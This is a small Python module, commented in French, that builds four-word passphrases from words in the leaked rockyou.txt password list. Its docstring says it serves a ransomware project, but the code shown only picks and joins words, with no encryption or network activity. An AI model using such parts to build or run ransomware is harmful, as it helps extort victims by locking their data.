"""
Génération de mots de passe aléatoires pour le ransomware
Utilise la wordlist rockyou.txt
"""

import secrets
from pathlib import Path

# Chemin vers la wordlist
# Option 1: rockyou.txt (fichier complet ~134 MB, à télécharger)
ROCKYOU_PATH = Path(__file__).parent / "rockyou.txt"

# Option 2: rockyou_filtered.txt (liste simple de ~100 mots pour les tests)
# ROCKYOU_PATH = Path(__file__).parent / "rockyou_filtered.txt"

# Cache de mots chargés depuis la wordlist
_WORD_CACHE = None
_CACHE_SIZE = 50000  # Nombre de mots à charger en cache


def _load_rockyou_words():
    """
    Charge un échantillon aléatoire de mots depuis rockyou.txt

    Returns:
        Liste de mots valides (4-10 caractères, alphanumériques)
    """
    global _WORD_CACHE

    if _WORD_CACHE is not None:
        return _WORD_CACHE

    if not ROCKYOU_PATH.exists():
        raise FileNotFoundError(
            f"rockyou.txt introuvable à {ROCKYOU_PATH}. "
        )

    print(f"[WORDLIST] Chargement et filtrage de {_CACHE_SIZE} mots depuis rockyou.txt...")

    # Lit et filtre les mots (4-10 caractères, alphanumériques uniquement)
    valid_words = []
    with open(ROCKYOU_PATH, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            word = line.strip()
            # Filtre: 4-10 caractères, alphanumériques uniquement
            if 4 <= len(word) <= 10 and word.isalnum():
                valid_words.append(word)

            # Arrête quand on a assez de mots
            if len(valid_words) >= _CACHE_SIZE * 2:
                break

    # Sélectionne aléatoirement CACHE_SIZE mots
    if len(valid_words) > _CACHE_SIZE:
        words = secrets.SystemRandom().sample(valid_words, _CACHE_SIZE)
    else:
        words = valid_words

    _WORD_CACHE = words
    print(f"[WORDLIST] {len(words)} mots chargés en cache")

    return words


def generate_random_password(num_words: int = 4, separator: str = "-") -> str:
    """
    Génère un mot de passe aléatoire composé de mots de rockyou.txt

    Args:
        num_words: Nombre de mots à utiliser (défaut: 4)
        separator: Séparateur entre les mots (défaut: "-")

    Returns:
        Mot de passe généré (ex: "dragon-shadow-matrix-secret")

    Note:
        Utilise rockyou.txt avec filtrage à la volée
        (4-10 caractères, alphanumériques uniquement)
    """
    word_list = _load_rockyou_words()
    words = [secrets.choice(word_list) for _ in range(num_words)]
    password = separator.join(words)
    return password


if __name__ == "__main__":
    # Test de génération de mots de passe
    print("Exemples de mots de passe générés:")
    for i in range(5):
        print(f"  {i+1}. {generate_random_password()}")
